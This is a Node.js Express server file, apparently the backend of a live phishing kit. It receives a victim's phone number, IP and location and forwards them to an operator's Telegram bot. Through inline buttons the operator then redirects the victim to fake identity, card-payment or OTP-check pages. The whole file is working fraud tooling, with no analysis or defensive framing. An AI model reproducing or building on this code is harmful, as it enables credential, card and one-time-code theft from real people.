// ✅ server.js completamente funcional para Render sin dependencias externas innecesarias

import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import dotenv from 'dotenv';
import crypto from 'crypto';

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Sesiones en memoria
const sessionState = new Map();

// Función para generar ID único sin 'uuid'
function generateSessionId() {
  return crypto.randomUUID();
}

// Ruta principal que inicia flujo (ej: /virtualpersona)
app.post('/virtualpersona', async (req, res) => {
  const { numero, ip, location } = req.body;

  const sessionId = generateSessionId();
  sessionState.set(sessionId, { estado: 'esperando', redirect_to: null });

  const message = `🔔 NUEVA SESIÓN
📱 Número: ${numero}
📍 IP: ${ip}
🌍 Ubicación: ${location}
🆔 SessionID: ${sessionId}`;
  const botones = {
    inline_keyboard: [
      [
        { text: "🔁 Error Logo", callback_data: `redirect:${sessionId}:id-check.html` },
        { text: "🔁 Error Tarjeta", callback_data: `redirect:${sessionId}:payment.html` },
        { text: "✅ Siguiente", callback_data: `redirect:${sessionId}:otp-check.html` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: process.env.CHAT_ID,
      text: message,
      reply_markup: botones
    })
  });

  res.json({ sessionId });
});

// Ruta que el frontend consulta para saber redirección
app.get('/instruction/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const estado = sessionState.get(sessionId);

  if (!estado) return res.status(404).json({ error: "Session not found" });

  res.json(estado);
});

// Webhook de botones de Telegram
app.post('/telegram/webhook', async (req, res) => {
  const { callback_query } = req.body;

  if (!callback_query?.data) return res.sendStatus(200);

  const [type, sessionId, redirect_to] = callback_query.data.split(':');

  if (type === 'redirect' && sessionState.has(sessionId)) {
    sessionState.set(sessionId, { estado: 'redirigiendo', redirect_to });
  }

  const chatId = callback_query.message.chat.id;
  const messageId = callback_query.message.message_id;

  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    })
  });

  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Servidor en línea en puerto ${port}`);
});
